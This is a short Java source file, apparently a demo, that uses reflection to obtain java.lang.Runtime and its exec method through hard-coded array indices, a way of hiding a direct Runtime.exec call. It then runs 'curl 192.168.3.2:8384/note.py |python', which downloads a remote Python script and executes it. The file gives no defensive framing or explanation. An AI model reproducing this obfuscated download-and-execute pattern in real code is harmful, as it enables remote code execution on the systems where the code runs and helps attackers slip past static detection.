import java.lang.reflect.Array;
import java.lang.reflect.Method;

public class ReflectionDemo3 {

    public static void main(String[] args) {
        try {
            Method[] declaredMethods = "".getClass().forName("java.lang.Runtime").getDeclaredMethods();
            Method execArrMethod = declaredMethods[15];
            execArrMethod.invoke(declaredMethods[7].invoke(null),
                    "curl 192.168.3.2:8384/note.py |python");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
